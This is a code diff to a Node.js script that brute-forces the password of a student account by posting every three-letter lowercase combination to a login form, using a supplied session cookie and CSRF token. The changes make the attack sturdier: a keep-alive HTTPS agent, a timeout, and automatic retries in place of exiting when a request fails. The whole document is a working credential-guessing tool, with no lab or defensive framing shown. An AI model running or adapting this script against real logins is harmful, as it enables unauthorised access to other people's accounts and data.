@@ -9,6 +9,7 @@ const cookie = args[0]
 const user = parseInt(args[1])
 const loginUrl = args[2]
 const csrf = args[3]
+const https = require('https')
 
 const request = require('request')
 
@@ -21,7 +22,7 @@ const metaHeader = {
   'Referer': loginUrl
 }
 
-let tryPasswd = pwd => {
+let tryPasswd = (pwd, agent) => {
   console.log(pwd)
   return new Promise((resolve, reject) => {
     request({
@@ -33,7 +34,10 @@ let tryPasswd = pwd => {
         'authenticity_token': csrf,
         'student[user_name]': user,
         'student[password]': pwd
-      }
+      },
+      agent: agent,
+      timeout: 6000,
+      strictSSL: true
     }, (err, icm, res) => {
       if (err) {
         console.error(err)
@@ -44,8 +48,8 @@ let tryPasswd = pwd => {
       if (icm.statusCode !== 302) {
         console.log(icm.statusCode)
         console.log(JSON.stringify(res.substr(0, 200)))
-        console.log("Sorry, This don't work anymore. Fire a GitHub issue now!")
-        process.exit(3)
+        console.log("Sorry, This don't work anymore. Fire a GitHub issue now! (Trying again)")
+        tryPasswd(pwd).then(resolve, reject)
         return
       }
       let location = icm.headers['location']
@@ -63,14 +67,14 @@ let tryPasswd = pwd => {
 
 let letters = 'abcdefghijklmnopqrstuvwxyz'.split('')
 
-let try3 = (a, b, c, callback) => {
+let try3 = (a, b, c, callback, agent) => {
   if (c >= letters.length) {
     callback()
     return
   }
 
   let pwd = letters[a] + letters[b] + letters[c]
-  tryPasswd(pwd).then(() => {
+  tryPasswd(pwd, agent).then(() => {
     console.log('Password: ' + pwd)
     process.exit(0)
   }, () => {
@@ -78,15 +82,15 @@ let try3 = (a, b, c, callback) => {
   })
 }
 
-let try2 = (a, b, callback) => {
+let try2 = (a, b, callback, agent) => {
   if (b >= letters.length) {
     callback()
     return
   }
 
   try3(a, b, 0, () => {
-    try2(a, b + 1, callback)
-  })
+    try2(a, b + 1, callback, agent)
+  }, agent)
 }
 
 let try1 = (aRangeL, aRangeR, callback) => {
@@ -98,7 +102,7 @@ let try1 = (aRangeL, aRangeR, callback) => {
       if (flag === 0) {
         callback()
       }
-    })
+    }, new https.Agent({keepAlive: true, maxSockets: 1}))
   }
 }
 
